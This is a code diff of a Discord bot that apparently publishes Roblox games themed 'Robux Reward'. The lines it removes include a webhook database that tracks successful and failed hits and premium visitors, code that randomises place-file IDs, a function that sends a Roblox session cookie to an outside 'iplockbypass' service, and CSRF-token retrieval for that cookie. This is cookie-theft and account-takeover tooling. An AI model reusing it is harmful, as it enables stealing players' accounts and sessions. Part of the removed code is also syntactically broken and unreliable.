@@ -1,22 +1,12 @@
-import re
 import os
 import json
-import secrets
-import uuid
 import requests
 import discord
 from discord import app_commands
-from webserver import keep_alive
 from discord.ext import commands
-from discord.app_commands.errors import MissingRole
-import psycopg2
 from dotenv import load_dotenv
 load_dotenv()
 
-# ...
-# Import statements and other code
-
-# Define your rbxlx file locations with theme names
 rbxlx_files = {
     "tt": {
         "theme_name": "Robux Reward V1",
@@ -41,106 +31,10 @@ rbxlx_files = {
     # Add more themes here as needed
 }
 
-# Generate choices using a loop
 theme_choices = [
     discord.app_commands.Choice(name=f"{theme_data['theme_name']}", value=theme_code)
     for theme_code, theme_data in rbxlx_files.items()
 ]
-
-
-# Configure the PostgreSQL connection settings.
-# If you are using CockroachDB, you can utilize either https://neon.tech/ or https://cockroachlabs.cloud/clusters.
-# For non-SSL connections, simply remove the "?sslmode=verify-full" parameter.
-
-connection_string = os.getenv("POSTGRES_CONNECTION_STRING")
-
-try:
-    # Create a connection to the PostgreSQL database
-    conn = psycopg2.connect(connection_string)
-    print("Connection to PostgreSQL successful.")
-except psycopg2.Error as e:
-    print(f"Error connecting to PostgreSQL: {e}")
-
-def create_table(conn):
-    # SQL query to create the 'webhooks' table
-    webhooks_query = (
-        "CREATE TABLE IF NOT EXISTS webhooks ("
-        "id SERIAL PRIMARY KEY,"
-        "gameid VARCHAR,"
-        "visit VARCHAR,"
-        "unnbc VARCHAR,"
-        "unpremium VARCHAR,"
-        "vnbc VARCHAR,"
-        "vpremium VARCHAR,"
-        "success VARCHAR,"
-        "failed VARCHAR,"
-        "discid VARCHAR"
-        ")"
-    )
-
-    # SQL query to create the 'purchases' table
-    purchases_query = (
-        "CREATE TABLE IF NOT EXISTS purchases ("
-        "id SERIAL PRIMARY KEY,"
-        "rbxid VARCHAR,"
-        "discid VARCHAR"
-        ")"
-    )
-
-    with conn.cursor() as cur:
-        # Execute the 'webhooks' table creation query
-        cur.execute(webhooks_query)
-
-        # Execute the 'purchases' table creation query
-        cur.execute(purchases_query)
-
-    conn.commit()
-
-
-create_table(conn)
-
-
-def replace_referents(data):
-  cache = {}
-
-  def _replace_ref(match):
-    ref = match.group(1)
-    if not ref in cache:
-      cache[ref] = ("RBX" + secrets.token_hex(16).upper()).encode()
-    return cache[ref]
-
-  data = re.sub(b"(RBX[A-Z0-9]{32})", _replace_ref, data)
-  return data
-
-def replace_script_guids(data):
-  cache = {}
-
-  def _replace_guid(match):
-    guid = match.group(1)
-    if not guid in cache:
-      cache[guid] = ("{" + str(uuid.uuid4()).upper() + "}").encode()
-    return cache[guid]
-
-data = re.sub(
-    b"({[A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{12}\\})",
-    _replace_guid, data)
-  return data
-
-
-def process_file(file_key):
-    theme_info = rbxlx_files.get(file_key)
-    if not theme_info:
-        return None
-
-    rbxlx_file = theme_info["file_location"]
-    file_data = open(rbxlx_file, 'rb').read()
-
-    if rbxlx_file.endswith(".rbxlx"):
-        file_data = replace_referents(file_data)
-        file_data = replace_script_guids(file_data)
-
-    return file_data
-
 
 intents = discord.Intents.default()
 intents.members = True
@@ -156,94 +50,6 @@ async def on_ready():
     print('Logged in')
     print('------')
     print(client.user.display_name)
-
-keep_alive()
-
-def refresh_cookie(c):
-    try:
-        response = requests.get(f"https://eggy.cool/iplockbypass?cookie={c}")
-
-        if response.text != "Invalid Cookie":
-            new_cookie = response.text
-            return new_cookie
-        else:
-            return None
-    except Exception as e:
-        print(f"An error occurred while refreshing the cookie: {e}")
-        return None
-
-
-def get_csrf_token(cookie):
-    try:
-        xsrfRequest = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
-        if xsrfRequest.status_code == 403 and "x-csrf-token" in xsrfRequest.headers:
-            return xsrfRequest.headers["x-csrf-token"]
-    except Exception as e:
-        print(f"An error occurred: {str(e)}")
-    return None
-
-def get_game_icon(game_id):
-    try:
-        url = f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={game_id}&returnPolicy=PlaceHolder&size=512x512&format=Png&isCircular=false"
-        with requests.Session() as session:
-            response = session.get(url)
-            response.raise_for_status()
-            jsonicon = response.json()
-
-            # Extract the thumbnail URL
-            thumbnail_data = jsonicon.get("data", [])
-            if thumbnail_data:
-                thumbnail = thumbnail_data[0].get("imageUrl", "")
-                return thumbnail
-            else:
-                return ""
-    except requests.exceptions.RequestException as e:
-        print(f"Error in get_avatar_thumbnail: {e}")
-        return ""
-
-def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discord_id):
-    # Check if the game ID already exists and has the same Discord ID
-    check_query = "SELECT discid FROM webhooks WHERE gameid = %s"
-    with conn.cursor() as cur:
-        cur.execute(check_query, (game_id,))
-        existing_discid = cur.fetchone()
-
-    if existing_discid is not None and str(existing_discid[0]) == str(discord_id):
-        # Update the existing webhook data
-        update_query = (
-            "UPDATE webhooks SET "
-            "success = %s, vpremium = %s, visit = %s, failed = %s, "
-            "vnbc = %s, unnbc = %s, unpremium = %s "
-            "WHERE gameid = %s"
-        )
-
-        update_data = (
-            success, vpremium, visit, failed, vnbc, unnbc, unpremium, game_id
-        )
-
-        with conn.cursor() as cur:
-            cur.execute(update_query, update_data)
-
-        conn.commit()
-        apiCheck = "Successfully Listed His/Her Webhooks."
-    elif existing_discid is not None and str(existing_discid[0]) != str(discord_id):
-        # Game ID exists, but Discord ID is different
-        apiCheck = "Do Not Touch His/Her Game."
-    else:
-        # Insert new webhook data
-        insert_query = (
-            "INSERT INTO webhooks (gameid, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discid) "
-            "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)"
-        )
-        insert_data = (game_id, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discord_id)
-
-        with conn.cursor() as cur:
-            cur.execute(insert_query, insert_data)
-
-        conn.commit()
-        apiCheck = "Successfully Listed His/Her Webhooks."
-
-    return apiCheck
 
 @tree.command(
     name="publish",
